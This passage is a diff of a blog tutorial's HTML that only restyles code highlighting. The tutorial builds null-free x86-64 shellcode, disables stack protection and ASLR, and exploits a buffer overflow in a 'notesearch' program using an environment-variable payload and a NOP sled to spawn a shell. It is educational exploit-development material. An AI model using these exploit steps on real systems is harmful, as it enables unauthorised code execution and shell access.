-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">60</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rdi</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span></span>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; exit</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rax</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">60</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> rdi</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">0</span></span>
+<span class="line"><span style="color:#91B4D5">syscall</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#50FA7B">bottom:</span></span>
-<span class="line"><span style="color:#FF79C6">call</span><span style="color:#F8F8F2"> above</span></span>
-<span class="line"><span style="color:#FF79C6">db</span><span style="color:#F8F8F2"> "Hello, world!", </span><span style="color:#BD93F9">0x0a</span></span></code></pre>
-<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="716" height="111" src="https://danielorihuela.dev/_astro/hexdump-t1.BVgF98mI_ZRCtrw.webp" ></p>
+<span class="line"><span style="color:#ADD7FF">bottom</span><span style="color:#A6ACCD">:</span></span>
+<span class="line"><span style="color:#91B4D5">call</span><span style="color:#A6ACCD"> above</span></span>
+<span class="line"><span style="color:#91B4D5">db</span><span style="color:#A6ACCD"> "Hello, world!", </span><span style="color:#5DE4C7">0x0a</span></span></code></pre>
+<p><img  loading="lazy" decoding="async"  width="716" height="111" src="https://danielorihuela.dev/_astro/hexdump-t1.BVgF98mI_Z1lghyB.webp" ></p>
 <p>We removed some null bytes.</p>
 <h3 id="use-smaller-registers">Use smaller registers</h3>
 <p>Computers have 16 registers. 64-bit registers are built on top of old
@@ -285,30 +291,30 @@ possible in each operation. However, the remaining bytes can contain any
 data. We need to zero them out. This can be easily achieved with the xor
 operation. Additionally, calling <code>mov register, 0</code> adds null bytes. We
 need to use <code>dec register</code>.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F8F8F2">BITS </span><span style="color:#BD93F9">64</span></span>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#A6ACCD">BITS </span><span style="color:#5DE4C7">64</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#FF79C6">jmp</span><span style="color:#F8F8F2"> short bottom</span></span>
+<span class="line"><span style="color:#91B4D5">jmp</span><span style="color:#A6ACCD"> short bottom</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#50FA7B">above:</span></span>
-<span class="line"><span style="color:#6272A4">; write</span></span>
-<span class="line"><span style="color:#FF79C6">xor</span><span style="color:#BD93F9"> rax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">rax</span></span>
-<span class="line"><span style="color:#FF79C6">inc</span><span style="color:#BD93F9"> al</span></span>
-<span class="line"><span style="color:#FF79C6">xor</span><span style="color:#BD93F9"> rdi</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">rdi</span></span>
-<span class="line"><span style="color:#FF79C6">inc</span><span style="color:#BD93F9"> rdi</span></span>
-<span class="line"><span style="color:#FF79C6">pop</span><span style="color:#BD93F9"> rsi</span></span>
-<span class="line"><span style="color:#FF79C6">xor</span><span style="color:#BD93F9"> rdx</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">rdx</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> dl</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">14</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span></span>
+<span class="line"><span style="color:#ADD7FF">above</span><span style="color:#A6ACCD">:</span></span>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; write</span></span>
+<span class="line"><span style="color:#91B4D5">xor</span><span style="color:#5DE4C7"> rax</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">rax</span></span>
+<span class="line"><span style="color:#91B4D5">inc</span><span style="color:#5DE4C7"> al</span></span>
+<span class="line"><span style="color:#91B4D5">xor</span><span style="color:#5DE4C7"> rdi</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">rdi</span></span>
+<span class="line"><span style="color:#91B4D5">inc</span><span style="color:#5DE4C7"> rdi</span></span>
+<span class="line"><span style="color:#91B4D5">pop</span><span style="color:#5DE4C7"> rsi</span></span>
+<span class="line"><span style="color:#91B4D5">xor</span><span style="color:#5DE4C7"> rdx</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">rdx</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> dl</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">14</span></span>
+<span class="line"><span style="color:#91B4D5">syscall</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#6272A4">; exit</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> al</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">60</span></span>
-<span class="line"><span style="color:#FF79C6">dec</span><span style="color:#BD93F9"> rdi</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span></span>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; exit</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> al</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">60</span></span>
+<span class="line"><span style="color:#91B4D5">dec</span><span style="color:#5DE4C7"> rdi</span></span>
+<span class="line"><span style="color:#91B4D5">syscall</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#50FA7B">bottom:</span></span>
-<span class="line"><span style="color:#FF79C6">call</span><span style="color:#F8F8F2"> above</span></span>
-<span class="line"><span style="color:#FF79C6">db</span><span style="color:#F8F8F2"> "Hello, world!", </span><span style="color:#BD93F9">0x0a</span></span></code></pre>
-<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="718" height="89" src="https://danielorihuela.dev/_astro/hexdump-t2.BA2n353f_Z1rWeOq.webp" ></p>
+<span class="line"><span style="color:#ADD7FF">bottom</span><span style="color:#A6ACCD">:</span></span>
+<span class="line"><span style="color:#91B4D5">call</span><span style="color:#A6ACCD"> above</span></span>
+<span class="line"><span style="color:#91B4D5">db</span><span style="color:#A6ACCD"> "Hello, world!", </span><span style="color:#5DE4C7">0x0a</span></span></code></pre>
+<p><img  loading="lazy" decoding="async"  width="718" height="89" src="https://danielorihuela.dev/_astro/hexdump-t2.BA2n353f_1fAVeG.webp" ></p>
 <p>We removed all the null bytes!!! This is it. Shellcodes are just a
 matter of executing system calls and avoiding null bytes. Let’s try it
 out with a hands-on exercise.</p>
@@ -333,9 +339,9 @@ overflows</a> and <a href="../store-shellcode-in-environment-variable">Store she
 environment variable</a>.</p>
 <p>Let’s compile the programs. Notice how we disable all the security
 measures for the vulnerable program.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> getenvaddr.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> getenvaddr</span></span>
-<span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> notesearch.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> notesearch</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -z</span><span style="color:#F1FA8C"> execstack</span><span style="color:#BD93F9"> -no-pie</span><span style="color:#BD93F9"> -g</span></span>
-<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> 0</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> sudo</span><span style="color:#F1FA8C"> tee</span><span style="color:#F1FA8C"> /proc/sys/kernel/randomize_va_space</span></span></code></pre>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#91B4D5">gcc</span><span style="color:#ADD7FF"> getenvaddr.c</span><span style="color:#ADD7FF"> -o</span><span style="color:#ADD7FF"> getenvaddr</span></span>
+<span class="line"><span style="color:#91B4D5">gcc</span><span style="color:#ADD7FF"> notesearch.c</span><span style="color:#ADD7FF"> -o</span><span style="color:#ADD7FF"> notesearch</span><span style="color:#ADD7FF"> -fno-stack-protector</span><span style="color:#ADD7FF"> -z</span><span style="color:#ADD7FF"> execstack</span><span style="color:#ADD7FF"> -no-pie</span><span style="color:#ADD7FF"> -g</span></span>
+<span class="line"><span style="color:#91B4D5">echo</span><span style="color:#5DE4C7"> 0</span><span style="color:#91B4D5"> |</span><span style="color:#91B4D5"> sudo</span><span style="color:#ADD7FF"> tee</span><span style="color:#ADD7FF"> /proc/sys/kernel/randomize_va_space</span></span></code></pre>
 <p>Now, we have to:</p>
 <ol>
 <li>Assemble the shellcode</li>
@@ -345,19 +351,19 @@ program point of view</li>
 <li>Inject the code into the vulnerable program</li>
 </ol>
 <p>Which translates into the following.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nasm</span><span style="color:#F1FA8C"> helloworld.asm</span></span>
-<span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> SHELLCODE</span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2">$(</span><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> helloworld</span><span style="color:#F8F8F2">)</span></span>
-<span class="line"><span style="color:#FF79C6">~</span><span style="color:#F8F8F2">/Desktop/getenvaddr SHELLCODE </span><span style="color:#FF79C6">~</span><span style="color:#F8F8F2">/Desktop/notesearch</span></span>
-<span class="line"><span style="color:#FF79C6">~</span><span style="color:#F8F8F2">/Desktop/notesearch $(</span><span style="color:#50FA7B">perl</span><span style="color:#BD93F9"> -e</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">print "\x90" x 120, "\xab\xef\xff\xff\xff\x7f\x00\x00"</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">)</span></span></code></pre>
-<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1336" height="234" src="https://danielorihuela.dev/_astro/write-stdout-exploit.PrTDxyvw_Q3xLg.webp" ></p>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#91B4D5">nasm</span><span style="color:#ADD7FF"> helloworld.asm</span></span>
+<span class="line"><span style="color:#5DE4C7">export</span><span style="color:#E4F0FB"> SHELLCODE</span><span style="color:#91B4D5">=</span><span style="color:#A6ACCD">$(</span><span style="color:#91B4D5">cat</span><span style="color:#ADD7FF"> helloworld</span><span style="color:#A6ACCD">)</span></span>
+<span class="line"><span style="color:#91B4D5">~</span><span style="color:#A6ACCD">/Desktop/getenvaddr SHELLCODE </span><span style="color:#91B4D5">~</span><span style="color:#A6ACCD">/Desktop/notesearch</span></span>
+<span class="line"><span style="color:#91B4D5">~</span><span style="color:#A6ACCD">/Desktop/notesearch $(</span><span style="color:#91B4D5">perl</span><span style="color:#ADD7FF"> -e</span><span style="color:#A6ACCD"> '</span><span style="color:#5DE4C7">print "\x90" x 120, "\xab\xef\xff\xff\xff\x7f\x00\x00"</span><span style="color:#A6ACCD">'</span><span style="color:#A6ACCD">)</span></span></code></pre>
+<p><img  loading="lazy" decoding="async"  width="1336" height="234" src="https://danielorihuela.dev/_astro/write-stdout-exploit.PrTDxyvw_Z22B1g6.webp" ></p>
 <p>Cool! We managed to take control of the program and print what we wanted
 to the stdout. This is rather dull. Let’s try to get a shell prompt!!!</p>
 <p>What would this look like in C?</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdlib.h</span><span style="color:#E9F284">></span></span>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#A6ACCD">#include </span><span style="color:#A6ACCD">&#x3C;</span><span style="color:#5DE4C7">stdlib.h</span><span style="color:#A6ACCD">></span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> main</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> argc</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">argv</span><span style="color:#FF79C6">[]</span><span style="color:#F8F8F2">) {</span></span>
-<span class="line"><span style="color:#50FA7B">    system</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">/bin/sh</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
-<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
+<span class="line"><span style="color:#91B4D5">int</span><span style="color:#ADD7FF"> main</span><span style="color:#A6ACCD">(</span><span style="color:#91B4D5">int</span><span style="color:#E4F0FB"> argc</span><span style="color:#A6ACCD">, </span><span style="color:#91B4D5">char</span><span style="color:#91B4D5"> *</span><span style="color:#E4F0FB">argv</span><span style="color:#5DE4C7">[]</span><span style="color:#A6ACCD">) {</span></span>
+<span class="line"><span style="color:#E4F0FBD0">    system</span><span style="color:#A6ACCD">(</span><span style="color:#A6ACCD">"</span><span style="color:#5DE4C7">/bin/sh</span><span style="color:#A6ACCD">"</span><span style="color:#A6ACCD">);</span></span>
+<span class="line"><span style="color:#A6ACCD">}</span></span></code></pre>
 <p>You can try it out with <code>gcc shell.c -o shell; chmod +x shell; ./shell</code>.</p>
 <p>If you search on the internet, you will find that
 <a href="https://man7.org/linux/man-pages/man3/system.3.html">system</a> internally
@@ -369,32 +375,32 @@ program, and key-value pairs to be passed as the environment. In our
 case, to spawn a shell, we are only interested in the first argument.
 Overall, building an assembly program that spawns a shell seems easy.
 Just call <code>execve</code> with <code>/bin/sh</code> as the program name.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#F8F8F2">BITS </span><span style="color:#BD93F9">64</span></span>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#A6ACCD">BITS </span><span style="color:#5DE4C7">64</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#FF79C6">jmp</span><span style="color:#F8F8F2"> short bottom</span></span>
+<span class="line"><span style="color:#91B4D5">jmp</span><span style="color:#A6ACCD"> short bottom</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#50FA7B">above:</span></span>
-<span class="line"><span style="color:#6272A4">; write</span></span>
-<span class="line"><span style="color:#FF79C6">xor</span><span style="color:#BD93F9"> rax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">rax</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> al</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">59</span></span>
-<span class="line"><span style="color:#FF79C6">xor</span><span style="color:#BD93F9"> rdi</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">rdi</span></span>
-<span class="line"><span style="color:#FF79C6">pop</span><span style="color:#BD93F9"> rdi</span></span>
-<span class="line"><span style="color:#FF79C6">xor</span><span style="color:#BD93F9"> rsi</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">rsi</span></span>
-<span class="line"><span style="color:#FF79C6">xor</span><span style="color:#BD93F9"> rdx</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">rdx</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span></span>
+<span class="line"><span style="color:#ADD7FF">above</span><span style="color:#A6ACCD">:</span></span>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; write</span></span>
+<span class="line"><span style="color:#91B4D5">xor</span><span style="color:#5DE4C7"> rax</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">rax</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> al</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">59</span></span>
+<span class="line"><span style="color:#91B4D5">xor</span><span style="color:#5DE4C7"> rdi</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">rdi</span></span>
+<span class="line"><span style="color:#91B4D5">pop</span><span style="color:#5DE4C7"> rdi</span></span>
+<span class="line"><span style="color:#91B4D5">xor</span><span style="color:#5DE4C7"> rsi</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">rsi</span></span>
+<span class="line"><span style="color:#91B4D5">xor</span><span style="color:#5DE4C7"> rdx</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">rdx</span></span>
+<span class="line"><span style="color:#91B4D5">syscall</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#6272A4">; exit</span></span>
-<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> al</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">60</span></span>
-<span class="line"><span style="color:#FF79C6">dec</span><span style="color:#BD93F9"> rdi</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span></span>
+<span class="line"><span style="color:#767C9DB0;font-style:italic">; exit</span></span>
+<span class="line"><span style="color:#91B4D5">mov</span><span style="color:#5DE4C7"> al</span><span style="color:#A6ACCD">, </span><span style="color:#5DE4C7">60</span></span>
+<span class="line"><span style="color:#91B4D5">dec</span><span style="color:#5DE4C7"> rdi</span></span>
+<span class="line"><span style="color:#91B4D5">syscall</span></span>
 <span class="line"></span>
-<span class="line"><span style="color:#50FA7B">bottom:</span></span>
-<span class="line"><span style="color:#FF79C6">call</span><span style="color:#F8F8F2"> above</span></span>
-<span class="line"><span style="color:#FF79C6">db</span><span style="color:#F8F8F2"> "/bin/sh"</span></span></code></pre>
+<span class="line"><span style="color:#ADD7FF">bottom</span><span style="color:#A6ACCD">:</span></span>
+<span class="line"><span style="color:#91B4D5">call</span><span style="color:#A6ACCD"> above</span></span>
+<span class="line"><span style="color:#91B4D5">db</span><span style="color:#A6ACCD"> "/bin/sh"</span></span></code></pre>
 <p>Let’s try to inject it.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nasm</span><span style="color:#F1FA8C"> shell.asm</span><span style="color:#F8F8F2">; </span><span style="color:#FF79C6">\</span></span>
-<span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> SHELLCODE</span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2">$(</span><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> shell</span><span style="color:#F8F8F2">); </span><span style="color:#FF79C6">\</span></span>
-<span class="line"><span style="color:#50FA7B">~/Desktop/getenvaddr</span><span style="color:#F1FA8C"> SHELLCODE</span><span style="color:#F1FA8C"> ~/Desktop/notesearch</span><span style="color:#F8F8F2">; </span><span style="color:#FF79C6">\</span></span>
-<span class="line"><span style="color:#50FA7B">~/Desktop/notesearch</span><span style="color:#F8F8F2"> $(</span><span style="color:#50FA7B">perl</span><span style="color:#BD93F9"> -e</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">print "\x90" x 120, "\xb3\xef\xff\xff\xff\x7f\x00\x00"</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">)</span></span></code></pre>
-<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1327" height="261" src="https://danielorihuela.dev/_astro/shell-exploit.y7YkD9m6_ivVrl.webp" ></p>
-<p>We got shell access!!!</p>  </div> </article> <footer></footer> </body></html>
+<pre class="astro-code poimandres" style="background-color:#1b1e28;color:#a6accd; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#91B4D5">nasm</span><span style="color:#ADD7FF"> shell.asm</span><span style="color:#A6ACCD">; </span><span style="color:#5FB3A1">\</span></span>
+<span class="line"><span style="color:#5DE4C7">export</span><span style="color:#E4F0FB"> SHELLCODE</span><span style="color:#91B4D5">=</span><span style="color:#A6ACCD">$(</span><span style="color:#91B4D5">cat</span><span style="color:#ADD7FF"> shell</span><span style="color:#A6ACCD">); </span><span style="color:#5FB3A1">\</span></span>
+<span class="line"><span style="color:#91B4D5">~/Desktop/getenvaddr</span><span style="color:#ADD7FF"> SHELLCODE</span><span style="color:#ADD7FF"> ~/Desktop/notesearch</span><span style="color:#A6ACCD">; </span><span style="color:#5FB3A1">\</span></span>
+<span class="line"><span style="color:#91B4D5">~/Desktop/notesearch</span><span style="color:#A6ACCD"> $(</span><span style="color:#91B4D5">perl</span><span style="color:#ADD7FF"> -e</span><span style="color:#A6ACCD"> '</span><span style="color:#5DE4C7">print "\x90" x 120, "\xb3\xef\xff\xff\xff\x7f\x00\x00"</span><span style="color:#A6ACCD">'</span><span style="color:#A6ACCD">)</span></span></code></pre>
+<p><img  loading="lazy" decoding="async"  width="1327" height="261" src="https://danielorihuela.dev/_astro/shell-exploit.y7YkD9m6_Z17n0f1.webp" ></p>
+<p>We got shell access!!!</p>  </div> </div>  </div> </div> </article>  <footer data-astro-cid-sz7xmlte> <div class="container" data-astro-cid-sz7xmlte> <div class="group" data-astro-cid-sz7xmlte> <a href="https://github.com/danielorihuela" class="link" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte> <span class="indicator" data-astro-cid-sz7xmlte></span> github </a><a href="mailto:danielorihuelarodriguez@gmail.com" class="link" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte> <span class="indicator" data-astro-cid-sz7xmlte></span> email </a> </div> <div class="group" data-astro-cid-sz7xmlte> <div class="status" data-astro-cid-sz7xmlte> <span class="light" data-astro-cid-sz7xmlte></span> SYS.ONLINE </div><div class="status" data-astro-cid-sz7xmlte> <span class="light" data-astro-cid-sz7xmlte></span> COMM.ENCRYPTED </div> </div> </div> </footer> </body></html>
